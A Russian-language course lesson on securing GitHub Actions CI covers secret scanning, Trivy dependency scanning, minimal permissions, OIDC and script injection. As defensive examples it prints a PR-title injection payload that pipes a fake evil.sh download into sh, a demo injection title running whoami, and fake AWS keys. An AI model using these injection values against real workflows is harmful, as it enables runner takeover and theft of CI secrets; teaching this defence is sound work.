---
layout: lesson
title: "Качество и безопасность в CI: сканеры, секреты, OIDC"
topic: 3
lesson: "3.4"
time: "2 ч"
---

## Зачем это нужно

Зелёный CI из прошлого урока говорит только «код запускается и тесты проходят». Он не заметит ключ AWS, случайно закоммиченный в `app.py`, уязвимую библиотеку в зависимостях и workflow, которому выдали права на запись во весь репозиторий. Сами CI-серверы при этом стали любимой целью атак: у них есть доступ к секретам и к продакшену.

На работе это выглядит так: утёкший токен находят боты за минуты, а отчёт о CVE (Common Vulnerabilities and Exposures, публичный список уязвимостей) приходит от безопасников с дедлайном. Правильный ответ: проверки «сдвигаются влево» (shift-left), то есть срабатывают на Pull Request, а не в продакшене.

Шаг проекта: в `~/notes` в `ci.yml` появляются jobs `secrets` (TruffleHog) и `trivy-fs`, минимальные `permissions:`, а рядом файл `.github/dependabot.yml`.

## Что нужно знать

- [Урок 3.1: коммиты и история](01-git-basics.md) - секрет, попавший в коммит, живёт в истории
- [Урок 3.2: remotes, rebase, Pull Request](02-remotes-workflow.md) - ветки, PR, защита `main`
- [Урок 3.3: CI в GitHub Actions](03-actions-ci.md) - workflow, job, step, `permissions`, matrix, `ci.yml` из прошлого урока
- [Урок 2.6: TLS и HTTPS](../02-network/06-tls.md) - подпись, срок жизни и проверка доверия (тот же принцип у токенов OIDC)

## Теория

### Модель угроз для CI

CI-runner выполняет код, который написал кто-то другой (автор PR), и держит секреты. Отсюда три риска: (1) секрет утёк в репозиторий или в лог, (2) в проект пришла уязвимая или вредоносная зависимость (supply chain, цепочка поставки), (3) сам workflow можно заставить выполнить чужую команду.

Для каждого риска есть класс инструмента:

| Класс | Что ищет | Пример | Когда |
|---|---|---|---|
| Secret scanning | ключи, токены, пароли в коде и истории | TruffleHog, gitleaks | PR |
| SCA (Software Composition Analysis) | известные CVE в зависимостях | Trivy, Dependabot | PR и по расписанию |
| SAST (Static Application Security Testing) | опасные конструкции в вашем коде | Semgrep, CodeQL | PR |
| DAST (Dynamic Application Security Testing) | уязвимости работающего сервиса | OWASP ZAP | стенд |

В курсе ставим первые два класса, остальные достаточно уметь назвать и различать. Есть и локальный уровень: фреймворк `pre-commit` запускает проверки до коммита, но его можно обойти (`git commit --no-verify`), поэтому решающая проверка всегда в CI.

> **Проверь понимание:** чем SCA отличается от SAST и какой из них найдёт CVE в библиотеке `requests`?

<details>
<summary>Ответ</summary>

SCA смотрит на чужой код (зависимости) и сверяет версии с базой CVE. SAST разбирает ваш собственный код. CVE в `requests` найдёт SCA (Trivy, Dependabot).

</details>

### Секреты: как они утекают и как их ловят

Секрет утекает тремя путями: коммит (`.env`, ключ в коде), лог CI (`echo $TOKEN`, `set -x`) и артефакт сборки. Даже удалённый следующим коммитом секрет остаётся в истории, значит, его нужно считать скомпрометированным (разбирали в [уроке 3.1](01-git-basics.md)).

TruffleHog сканирует историю git и для найденной строки может проверить, живой ли это секрет: сделать запрос к API провайдера (verification, проверка). Режимы:

- `--results=verified` (старое имя флага `--only-verified`): только подтверждённо живые секреты. Мало шума, но отозванный или фейковый ключ не поймается.
- `--results=verified,unverified,unknown`: всё похожее. Больше ложных срабатываний (false positive), зато нет пропусков.

На практике в CI ставят `verified,unknown`: живой ключ и «не смогли проверить» (сеть, лимиты) блокируют PR, отозванные ключи не шумят.

Порядок действий при утечке всегда один: **сначала отозвать и заменить (ротация, rotation)**, потом чистить историю. Чистка (`git filter-repo`) не отменяет утечку: репозиторий мог уже склонировать бот. Где секреты хранить правильно, разберём в [уроке 9.2](../09-secrets-gitops/02-vault-k8s-eso.md).

> **Проверь понимание:** ты нашёл в PR закоммиченный токен и сразу сделал `git push --force` с удалением коммита. Что ещё обязательно нужно сделать?

<details>
<summary>Ответ</summary>

Отозвать токен у провайдера и выпустить новый: он мог быть скопирован, пока лежал в истории (форки, кэши, боты). Затем проверить логи использования токена. Переписывание истории вторично.

</details>

### Права GITHUB_TOKEN и минимальные permissions

В каждый запуск GitHub выдаёт временный токен `GITHUB_TOKEN`. Его права по умолчанию зависят от настроек репозитория и могут включать запись. Принцип наименьших привилегий (least privilege): на уровне workflow пишем `permissions: contents: read`, а нужное расширение даём конкретному job.

```yaml
permissions:
  contents: read          # по умолчанию только чтение кода

jobs:
  scan:
    permissions:
      contents: read
      security-events: write   # расширение только для одного job
```

Если workflow скомпрометирован, злоумышленник получит токен только с правом чтения.

### Script injection: когда данные становятся кодом

Выражение {% raw %}`${{ github.event.pull_request.title }}`{% endraw %} подставляется в текст скрипта ДО запуска shell. Если заголовок PR содержит `"; curl evil.sh | sh #`, он станет частью команды. Автор PR управляет заголовком, значит, управляет и твоим runner.

Опасные поля: `title`, `body`, имя ветки (`head_ref`), сообщения коммитов. Безопасный приём: передать значение через переменную окружения. Тогда shell читает её как данные, а не как код.

{% raw %}
```yaml
# ПЛОХО: заголовок вставляется в текст команды
- run: echo "PR: ${{ github.event.pull_request.title }}"

# ХОРОШО: значение приходит переменной окружения
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR: $TITLE"
```
{% endraw %}

Второе правило: триггер `pull_request_target` запускает workflow из `main` С доступом к секретам, но может работать с кодом из форка. Не делай `checkout` кода PR в таком workflow. Для обычной проверки PR используй `pull_request`: для форков секретов там нет.

> **Проверь понимание:** почему `echo "$TITLE"` безопасно, а {% raw %}`echo "${{ ... }}"`{% endraw %} нет?

<details>
<summary>Ответ</summary>

Подстановка {% raw %}`${{ }}`{% endraw %} делается GitHub до запуска shell: строка целиком становится текстом скрипта. Переменная окружения раскрывается уже внутри shell как значение, кавычки и `;` в нём не превращаются в команды.

</details>

### Supply chain: сторонние actions и закрепление версий

`uses: owner/action@v4` доверяет тегу, а тег автор (или тот, кто взломал автора) может передвинуть на другой код. Известные атаки на популярные actions строились именно так: тег подменяли на код, печатающий секреты в лог. Защита: закрепление по SHA коммита.

```yaml
# тег можно передвинуть, SHA нельзя
- uses: actions/checkout@v7.0.1
- uses: actions/checkout@<полный-sha-коммита-40-символов>   # v7.0.1
```

В курсе для читаемости используем теги проверенных версий, а для чувствительных workflow (доступ к облаку, публикация релизов) закрепляют по SHA. Обновлять SHA руками неудобно, поэтому есть Dependabot: он читает `.github/dependabot.yml` и сам открывает PR с обновлением actions и pip-зависимостей. PR проходит твой CI, ты смотришь и мержишь.

### OIDC: вход в облако без хранимых ключей

Раньше в облако из CI ходили статическим ключом в секретах репозитория: живёт вечно, утёк один раз, доступ есть навсегда. OIDC (OpenID Connect) заменяет ключ подписанным токеном на один запуск:

1. Job с `permissions: id-token: write` просит у GitHub JWT (JSON Web Token).
2. В токене claims (утверждения): репозиторий, ветка, workflow, `sub` вида `repo:owner/notes:ref:refs/heads/main`.
3. Облако (AWS, Yandex Cloud) заранее настроено доверять GitHub и проверяет подпись и claims (например, «только репозиторий `notes`, только `main`»).
4. Облако выдаёт временные ключи на минуты.

Хранимого секрета нет, украсть нечего, срок жизни короткий, права ограничены условием на `sub`. Реальное подключение к облаку сделаем в [уроке 6.3](../06-cloud/03-deploy-notes-vm.md), здесь разбираем сам токен без облака.

> **Проверь понимание:** что ограничивает условие на `sub` в доверии облака к GitHub?

<details>
<summary>Ответ</summary>

Какие именно запуски получат роль: конкретный репозиторий, ветка или окружение. Без условия любой репозиторий на GitHub мог бы получить твои права.

</details>

## Практика

### Задание 1. Как выглядит OIDC-токен

**Цель:** увидеть claims токена, которым CI доказывает облаку, кто он.

**Предскажи:** какое значение будет у `sub` для запуска на ветке `main` и чем определяется поле `aud`?

<details>
<summary>Ответ</summary>

`sub` будет `repo:<user>/notes:ref:refs/heads/main`. `aud` (для кого выпущен токен) по умолчанию адрес владельца на GitHub, а в нашем шаге мы зададим его параметром `audience` сами.

</details>

**Шаги:**

1. Создай ветку и временный workflow (в проект он не попадёт, ветку потом удалим):

```bash
cd ~/notes
git switch -c tmp/oidc-demo
mkdir -p .github/workflows
```

2. Файл `.github/workflows/oidc-demo.yml`:

```yaml
name: oidc-demo
on: push
permissions:
  contents: read
  id-token: write          # разрешение запросить OIDC-токен
jobs:
  show:
    runs-on: ubuntu-24.04
    steps:
      - name: Показать claims токена
        run: |
          # запрашиваем JWT у GitHub, адрес и токен запроса выдаёт runner
          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.example.com" | jq -r .value)
          # JWT состоит из трёх частей через точку, нужна средняя (payload)
          PAYLOAD=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+')
          # добавляем padding base64, иначе декодер ругается
          while [ $(( ${#PAYLOAD} % 4 )) -ne 0 ]; do PAYLOAD="$PAYLOAD="; done
          echo "$PAYLOAD" | base64 -d | jq '{iss, sub, aud, ref, repository, workflow, exp}'
```

3. Закоммить и запушь: workflow сработает на push в ветку.

```bash
git add .github/workflows/oidc-demo.yml
git commit -m "tmp: показать claims OIDC"
git push -u origin tmp/oidc-demo
```

**Что должно получиться:** в логе шага `Показать claims токена` JSON такого вида (значения твои).

```text
{
  "iss": "https://token.actions.githubusercontent.com",
  "sub": "repo:<user>/notes:ref:refs/heads/tmp/oidc-demo",
  "aud": "sts.example.com",
  "ref": "refs/heads/tmp/oidc-demo",
  "repository": "<user>/notes",
  "workflow": "oidc-demo",
  "exp": 1790000000
}
```

`aud` мы запросили сами, облако проверяет, что токен выпущен для него. `exp` наступает через несколько минут после запуска.

**Объясни себе:**
- Почему в логе безопасно печатать payload, но нельзя печатать сам JWT?
- Что облако должно проверить, кроме подписи?
- Что изменится в `sub`, если запустить тот же workflow из другой ветки или другого репозитория?

**Типичные ошибки:**
- `Unable to get ACTIONS_ID_TOKEN_REQUEST_URL env variable`: у job нет `id-token: write`. Добавь в `permissions`.
- `base64: invalid input`: не добавлен padding или не заменены `_-`. Скопируй шаг целиком.
- Workflow не запустился: файл лежит не в `.github/workflows/` или отступы в YAML сломаны (смотри вкладку Actions).

Убери за собой:

```bash
git switch main
git branch -D tmp/oidc-demo
git push origin --delete tmp/oidc-demo
```

### Задание 2. Собрать проверки и поймать секрет

**Цель:** добавить в `ci.yml` jobs `secrets` и `trivy-fs`, права и `concurrency`, затем убедиться, что `secrets` блокирует PR с ключом.

**Предскажи:** мы закоммитим фейковый ключ формата AWS (такого аккаунта нет). Пройдёт ли проверка с `--results=verified`? А с `verified,unverified,unknown`?

<details>
<summary>Ответ</summary>

С `verified` пройдёт: ключ не подтверждается на стороне AWS, TruffleHog его не покажет. С `verified,unverified,unknown` упадёт: строка похожа на ключ AWS. Строгий режим ловит больше и шумит больше.

</details>

**Шаги:**

1. Ветка:

```bash
cd ~/notes
git switch main && git pull
git switch -c chore/ci-security
```

2. Замени `.github/workflows/ci.yml` целиком:

{% raw %}
```yaml
name: ci

on:
  pull_request:
  push:
    branches: [main]

# права по умолчанию для всех jobs: только чтение кода
permissions:
  contents: read

# новый запуск отменяет предыдущий для той же ветки или PR
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  lint:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7.0.1
      - uses: actions/setup-python@v7.0.0
        with:
          python-version: "3.13"
      - run: pip install -r requirements-dev.txt
      - run: ruff check .

  test:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        python-version: ["3.13", "3.14"]
    steps:
      - uses: actions/checkout@v7.0.1
      - uses: actions/setup-python@v7.0.0
        with:
          python-version: ${{ matrix.python-version }}
      - run: python -m unittest

  secrets:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7.0.1
        with:
          fetch-depth: 0        # нужна вся история, а не один коммит
      - name: TruffleHog
        uses: trufflesecurity/trufflehog@v3.97.9
        with:
          # живой или непроверяемый секрет блокирует PR, отозванные не шумят
          extra_args: --results=verified,unknown

  trivy-fs:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7.0.1
      - name: Trivy fs
        uses: aquasecurity/trivy-action@v0.74.0   # проверь актуальную версию на странице проекта
        with:
          version: v0.74.0
          scan-type: fs
          scan-ref: .
          severity: HIGH,CRITICAL
          ignore-unfixed: true      # не шуметь про уязвимости без исправления
          exit-code: "1"
```
{% endraw %}

Если шаги `lint` и `test` в твоём `ci.yml` из 3.3 отличаются, оставь свои и добавь только `secrets`, `trivy-fs`, `permissions` и `concurrency`.

3. Закоммить и запушь, открой Pull Request. Все проверки должны быть зелёными:

```bash
git add .github/workflows/ci.yml
git commit -m "ci: secrets, trivy fs, минимальные permissions"
git push -u origin chore/ci-security
```

4. Положи в код «утёкший» ключ отдельным коммитом и запушь:

```bash
cat >> app.py <<'PYEOF'

# временный тест: фейковый ключ AWS, аккаунта не существует
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
PYEOF
git add -A && git commit -m "test: фейковый ключ" && git push
```

5. Посмотри job `secrets`. Затем замени `--results=verified,unknown` на `--results=verified,unverified,unknown`, запушь и сравни.

**Что должно получиться:** в режиме `verified,unknown` ключ может пройти (нет подтверждения), в строгом job падает красным:

```text
Found unverified result
Detector Type: AWS
Decoder Type: PLAIN
Raw result: AKIAIOSFODNN7EXAMPLE
File: app.py
```

Некоторые детекторы игнорируют известные примеры из документации AWS. Если job остался зелёным и в строгом режиме, возьми строку `ghp_` плюс 36 случайных букв и цифр. Точный вывод зависит от версии TruffleHog.

**Объясни себе:**
- Почему `fetch-depth: 0`, и что не найдётся без него?
- Секрет убрали из последнего коммита. Найдёт ли его TruffleHog?
- Какой режим ты выберешь для боевого репозитория и почему?

**Типичные ошибки:**
- `Invalid workflow file: .github/workflows/ci.yml#L12 ... Unexpected value 'concurency'`: опечатка в ключе. Помогает `actionlint`.
- `BASE and HEAD commits are the same. TruffleHog won't scan anything.`: сканировать нечего, коммиты base и head совпали (например, пустой push). Сделай новый коммит.
- `Unable to resolve action aquasecurity/trivy-action@v0.74.0, unable to find version`: такого тега нет. Открой страницу проекта и возьми актуальный.

Убери ключ и верни режим `verified,unknown` (в реальной жизни ключ пришлось бы ещё и отозвать):

```bash
git reset --hard HEAD~2
git push --force-with-lease
```

Замечание: `HEAD~2` верно, если после `ci: ...` ты сделал ровно два коммита (ключ и смена режима). Проверь `git log --oneline` перед сбросом.

### Задание 3. Поймать уязвимую зависимость

**Цель:** увидеть, как `trivy-fs` блокирует PR с уязвимой библиотекой.

**Предскажи:** мы добавим в `requirements.txt` старую версию `requests`. Что покажет Trivy и какой будет код выхода при `exit-code: "1"`?

<details>
<summary>Ответ</summary>

Таблицу с пакетом, установленной версией, версией с исправлением (Fixed Version), CVE и серьёзностью. Код выхода 1, job падает, если есть уязвимости выбранных серьёзностей. Без `exit-code: "1"` Trivy всегда завершается с 0.

</details>

**Шаги:**

1. На той же ветке `chore/ci-security` добавь строку и запушь:

```bash
echo "requests==2.19.0" >> requirements.txt
git add -A && git commit -m "test: уязвимая зависимость" && git push
```

2. Открой лог job `trivy-fs`. Тот же скан можно сделать локально, если Trivy установлен:

```bash
trivy fs --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 .
```

3. Убери тестовый коммит:

```bash
git reset --hard HEAD~1
git push --force-with-lease
```

**Что должно получиться:** job красный, в логе таблица (числа зависят от базы уязвимостей на день запуска).

```text
Report Summary

Target             Type  Vulnerabilities
requirements.txt   pip   N

requirements.txt (pip)
Total: N (HIGH: X, CRITICAL: Y)

Library   Vulnerability   Severity   Status   Installed   Fixed Version
requests  CVE-2018-18074  HIGH       fixed    2.19.0      2.20.0
```

**Объясни себе:**
- Зачем `ignore-unfixed` и какой риск у этой настройки?
- Чем `trivy fs` отличается от `trivy image` (образы разберём в [уроке 4.8](../04-docker/08-image-security.md))?
- Что делать, если исправленной версии нет, а CVE HIGH?

**Типичные ошибки:**
- `failed to download vulnerability DB ... TOOMANYREQUESTS`: лимит скачивания базы. Повтори запуск позже, в боевом CI кэшируй `~/.cache/trivy`.
- `fatal: The current branch chore/ci-security has no upstream branch`: ветку не пушили с `-u`. Выполни `git push -u origin chore/ci-security`.

### Задание 4. Шаг проекта: Dependabot и required checks

**Цель:** привести `~/notes` к состоянию конца урока: четыре jobs в `ci.yml`, минимальные права, `.github/dependabot.yml`, required checks на `main`.

**Предскажи:** сколько проверок будет у PR (учти matrix из [урока 3.3](03-actions-ci.md))?

<details>
<summary>Ответ</summary>

Пять: `lint`, `test (3.13)`, `test (3.14)`, `secrets`, `trivy-fs`. Именно эти имена выбираешь в required checks.

</details>

**Шаги:**

1. На ветке `chore/ci-security` (в ней уже `ci.yml`, тестовых коммитов нет) создай `.github/dependabot.yml`:

```yaml
version: 2
updates:
  # обновления версий actions из workflow
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
  # обновления pip-зависимостей
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

2. Закоммить, запушь, дождись пяти зелёных проверок и смержи PR (squash, как в [уроке 3.2](02-remotes-workflow.md)):

```bash
git add .github/dependabot.yml
git commit -m "ci: dependabot для actions и pip"
git push
```

3. В GitHub: Settings, Branches, правило для `main`, включи Require status checks to pass и добавь `lint`, `test (3.13)`, `test (3.14)`, `secrets`, `trivy-fs`. Проверь, что Dependabot включён: Settings, Code security.

**Что должно получиться:**

```text
lint             pass
test (3.13)      pass
test (3.14)      pass
secrets          pass
trivy-fs         pass
```

Проверка из терминала (нужен `gh`):

```bash
gh pr checks
gh api repos/:owner/:repo/branches/main/protection/required_status_checks --jq '.contexts'
```

**Объясни себе:**
- Почему `permissions: contents: read` стоит на верхнем уровне, а не только в одном job?
- Зачем `concurrency` с `cancel-in-progress` и чем он опасен для деплоя?
- Что произойдёт с PR от Dependabot, если он сломает тесты?

**Типичные ошибки:**
- Required check висит как `Expected - Waiting for status to be reported`: имя в правиле не совпадает с именем job (например, `test` вместо `test (3.13)`). Выбирай из списка после хотя бы одного запуска.
- `Resource not accessible by integration`: job пытается сделать то, на что нет прав. Добавь право этому job, а не всему workflow.

## Сломай и почини

Три сценария GitHub, поломки делаешь руками на отдельных ветках, всё убираешь после.

### Симптом

1. **Красный `secrets`** на PR, в диффе которого нет ничего подозрительного.
2. **Workflow выполняет чужую команду:** в логе шага видна строка, которую ты не писал.
3. **Красный `trivy-fs`** на PR, который не менял зависимости.

Воспроизведение сценария 2: ветка `tmp/inject` и файл `.github/workflows/inject-demo.yml`.

{% raw %}
```yaml
name: inject-demo
on:
  pull_request:
permissions:
  contents: read
jobs:
  hello:
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Привет, ${{ github.event.pull_request.title }}"
```
{% endraw %}

Открой PR с заголовком ровно таким: `x"; echo INJECTED-$(whoami); echo "`. В логе появится строка `INJECTED-runner`. Команда безвредная, но так же можно вызвать `curl` с секретами.

Сценарий 1: закоммить в `app.py` строку с `ghp_` и 36 случайными символами, а следующим коммитом удали её. Сценарий 3: верни в `requirements.txt` строку `requests==2.19.0`.

### Гипотезы

- Сценарий 1: ложное срабатывание? секрет удалён в последнем коммите, но остался в истории? ключ лежит в тестовом файле?
- Сценарий 2: значение из события вставлено прямо в `run`? использован `pull_request_target`?
- Сценарий 3: пакет прямой или транзитивный? есть ли версия с исправлением? нужна ли эта CVE твоему коду?

### Проверки

```bash
# что нашёл сканер по всей истории, локально (если TruffleHog установлен)
trufflehog git file://. --results=verified,unknown --fail

# в каком коммите появилась строка
git log -p -S'ghp_' --oneline

# все опасные подстановки в workflow-файлах
grep -rn 'github.event' .github/workflows/

# какие версии зависимостей закреплены
cat requirements.txt
```

### Исправление

<details>
<summary>Разбор всех сценариев</summary>

**Сценарий 1.** Порядок: (1) отозвать токен у провайдера, выпустить новый, положить в секреты CI; (2) проверить, не использовали ли старый (audit log провайдера); (3) убрать секрет из кода, читать из окружения; (4) при необходимости почистить историю (`git filter-repo --replace-text`), сделать force-push и попросить команду переклонировать репозиторий; (5) настоящее ложное срабатывание внести в исключения с комментарием, почему. Чистка истории без шага 1 бесполезна.

**Сценарий 2.** Замени подстановку на переменную окружения:

{% raw %}
```yaml
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Привет, $TITLE"
```
{% endraw %}

Перезапусти проверку: в логе будет весь заголовок как текст, без выполненной команды. Дополнительно: `permissions` минимальные, `pull_request_target` не использовать без острой необходимости, сторонние actions закреплять.

**Сценарий 3.** Обнови пакет до исправленной версии. Если исправления нет, оцени, вызывается ли уязвимый код; если нет, добавь CVE в `.trivyignore` с комментарием и сроком пересмотра. Job целиком не выключай.

После разбора удали ветки `tmp/inject` и тестовые ветки, а `inject-demo.yml` в `main` не мержи.

</details>

## Вопросы с собеседований

### 1. [junior] В репозитории нашли закоммиченный пароль от базы. Что делаешь?

Первым делом меняю пароль в самой базе и там, где приложение его читает. Потом смотрю по логам БД, не заходил ли кто-то посторонний. Затем убираю секрет из кода и, если нужно, чищу историю. Добавляю сканер секретов в CI, чтобы не повторилось.

**Что хотят услышать:** ротация раньше чистки истории, «считаем скомпрометированным», аудит использования, профилактика (сканер, pre-commit, `.gitignore`).

**Красный флаг:** «удалю файл и сделаю новый коммит» или «force-push решит проблему».

### 2. [junior] Что делает `permissions: contents: read` в workflow и зачем оно?

Ограничивает права `GITHUB_TOKEN` только чтением кода. Если в workflow найдут уязвимость или подменят action, злоумышленник не сможет писать в репозиторий, создавать релизы и менять PR. Расширяю права только тем jobs, которым нужно.

**Что хотят услышать:** least privilege, права на уровне workflow и job, примеры расширений (`packages: write`, `id-token: write`).

**Красный флаг:** «не знаю, копирую из примера» или `permissions: write-all`.

### 3. [junior] В CI упал `trivy fs` с HIGH CVE в зависимости. Твои действия?

Смотрю в таблице пакет, версию и Fixed Version. Если исправление есть, поднимаю версию, гоняю тесты, мержу. Если нет, оцениваю, достижим ли уязвимый код, и при необходимости заношу в `.trivyignore` с комментарием и датой пересмотра.

**Что хотят услышать:** чтение отчёта, прямые и транзитивные зависимости, осознанное исключение, а не отключение проверки.

**Красный флаг:** «отключу job, чтобы не мешал».

### 4. [junior] Зачем Dependabot, если есть `trivy fs`?

Trivy проверяет то, что уже в репозитории, и блокирует PR. Dependabot сам предлагает обновления отдельными PR, которые проходят твой CI. Первое находит проблему, второе помогает закрыть её и не копить долг.

**Что хотят услышать:** «обнаружить» против «предложить исправление», регулярность, актуальные версии actions.

**Красный флаг:** «Dependabot это то же самое, что Trivy».

### 5. [middle] В ревью попал workflow с {% raw %}`run: echo "${{ github.event.issue.title }}"`{% endraw %}. Что не так?

Это script injection: заголовок issue вставляется в текст скрипта до запуска shell, автор issue может выполнить команду на runner и украсть секреты. Исправляю: `env: TITLE: ...` и `echo "$TITLE"`. Дополнительно сужаю `permissions`.

**Что хотят услышать:** подстановка до shell, недоверенные поля (title, body, head_ref), передача через env, минимальные права.

**Красный флаг:** «issue пишут только свои, значит нормально».

### 6. [middle] Нужно деплоить из GitHub Actions в облако. Где хранить ключ доступа?

Нигде: настраиваю OIDC. Облако доверяет токену GitHub, роль выдаётся только репозиторию `notes` и ветке `main` (условие на `sub`), ключи временные. Job получает `id-token: write` и обменивает JWT на короткоживущие ключи. Статический ключ в секретах остаётся запасным вариантом.

**Что хотят услышать:** JWT, claims, условие на `sub` и `aud`, срок жизни минуты, нет секрета для кражи.

**Красный флаг:** «положу ключ администратора в Secrets, он же зашифрован».

### 7. [middle] Сторонний action в тысячах репозиториев скомпрометировали. Как ограничить ущерб заранее?

Закрепляю actions по SHA, а не по тегу, минимальные `permissions`, секреты только тем jobs, которым они нужны, окружения с ручным подтверждением для деплоя. Обновления идут через Dependabot и ревью diff. Для критичных шагов лучше свой форк или скрипт.

**Что хотят услышать:** тег можно передвинуть, SHA нет, least privilege, ротация секретов после инцидента, поиск по org, где использовался action.

**Красный флаг:** «у action много звёзд, поэтому безопасен».

### 8. [middle] Чем опасен `pull_request_target` и когда он нужен?

Он запускает workflow из базовой ветки с секретами и правом записи, а PR может прийти из форка. Если сделать `checkout` кода из PR и запустить его, чужой код получит секреты. Нужен для безобидных задач (метки, комментарии) без запуска кода из PR. Для тестов использую `pull_request`.

**Что хотят услышать:** контекст выполнения, секреты недоступны форкам в `pull_request`, никогда не выполнять код PR в `pull_request_target`.

**Красный флаг:** «это то же самое, что `pull_request`, просто новее».

### 9. [middle] Безопасники прислали 200 CVE из Trivy. С чего начнёшь?

Отсекаю шум: только исправимые (`ignore-unfixed`), HIGH и CRITICAL, что реально попало в образ, а не в dev-зависимости. Смотрю, вызывается ли уязвимый код и доступен ли сервис снаружи. Группирую по пакету: часто одно обновление закрывает десятки CVE. Остальное заношу в бэклог со сроком.

**Что хотят услышать:** приоритизация по серьёзности, достижимости и экспозиции, группировка, автоматизация обновлений, срок пересмотра исключений.

**Красный флаг:** «исправлю всё подряд по порядку» или «проигнорирую, это же сканер».

### 10. [middle] Прод отвечает 502 после ночного мержа Dependabot. Твои действия?

Сначала откат: возвращаю прошлую версию (revert PR или предыдущий образ), сервис живой. Потом смотрю логи приложения и nginx, что именно поменялось в diff зависимостей, и воспроизвожу локально. Разбираюсь, почему CI не поймал: не было теста на запуск сервиса? Добавляю проверку.

**Что хотят услышать:** митигация раньше поиска причины, связь релиза и симптома по времени, разбор пробела в CI, автомерж только для патчей с проверенным тестами.

**Красный флаг:** «буду искать причину прямо на проде, откатывать не хочу».

## Проверено на версиях

- GitHub Actions: checkout v7.0.1, setup-python v7.0.0
- TruffleHog: v3.97.9
- Trivy: v0.74.0 (тег `aquasecurity/trivy-action`: версия не закреплена, проверь актуальную версию на странице проекта)
- ruff: версия не закреплена, проверь актуальную версию на странице проекта
- Python: 3.13 и 3.14 (matrix)
- Runner: ubuntu-24.04

## Итог урока: ты умеешь

- [ ] умею объяснить три риска CI (секреты, зависимости, сам workflow) и назвать класс инструмента для каждого
- [ ] умею добавить job TruffleHog и выбрать режим verification под задачу
- [ ] умею добавить `trivy fs` с порогом серьёзности и прочитать таблицу CVE
- [ ] умею ограничить права через `permissions` на уровне workflow и job
- [ ] умею найти и исправить script injection через переменную окружения
- [ ] умею настроить `dependabot.yml` и required checks на `main`
- [ ] умею объяснить, как OIDC заменяет статические ключи, и прочитать claims токена
- [ ] умею вести реакцию на утёкший секрет: отозвать, заменить, проверить, почистить

**Дальше:** [Урок 3.5: Релизы: semver, теги и GitHub Releases](05-release-flow.md)
